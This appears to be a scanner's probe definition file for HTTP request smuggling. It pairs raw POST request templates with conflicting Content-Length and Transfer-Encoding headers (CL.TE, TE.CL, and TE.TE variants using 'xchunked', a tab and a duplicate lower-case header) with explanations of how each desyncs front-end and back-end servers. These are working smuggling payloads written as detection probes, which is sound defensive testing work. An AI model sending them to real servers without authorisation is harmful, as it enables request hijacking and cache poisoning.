cl_te.description: CL.TE request smuggling — front-end uses Content-Length, back-end uses Transfer-Encoding

probes.payload:
POST / HTTP/1.1
Host: {{host}}
Content-Length: 6
Transfer-Encoding: chunked

0

G
probes.description: CL.TE smuggling detection — front-end forwards 6 bytes (Content-Length), back-end parses chunked and sees 0-length chunk terminator, leaving 'G' as start of next request. Timeout indicates back-end is waiting for the smuggled request to complete.

te_cl.description: TE.CL request smuggling — front-end uses Transfer-Encoding, back-end uses Content-Length

probes.payload:
POST / HTTP/1.1
Host: {{host}}
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
probes.description: TE.CL smuggling detection — front-end processes chunked encoding (chunk size 8 = 'SMUGGLED'), back-end reads only 3 bytes (Content-Length) and treats the rest as a new request. Timeout or status error indicates desync.

te_te.description: TE.TE request smuggling — both servers use Transfer-Encoding but one can be confused by obfuscated TE header variants

probes.payload:
POST / HTTP/1.1
Host: {{host}}
Content-Length: 3
Transfer-Encoding: xchunked

0
probes.description: TE obfuscation via invalid value 'xchunked' — if front-end ignores malformed TE and falls back to Content-Length while back-end rejects and also falls back, differential parsing causes desync

probes.payload:
POST / HTTP/1.1
Host: {{host}}
Content-Length: 3
Transfer-Encoding:	chunked

0
probes.description: TE obfuscation via tab before value — some servers reject TE headers with tab whitespace and fall back to Content-Length, creating parsing differential

probes.payload:
POST / HTTP/1.1
Host: {{host}}
Content-Length: 3
Transfer-Encoding: chunked
Transfer-encoding: x

0
probes.description: TE obfuscation via duplicate header with different case — one server uses first TE (chunked), the other uses second (invalid 'x') and falls back to Content-Length, causing desync
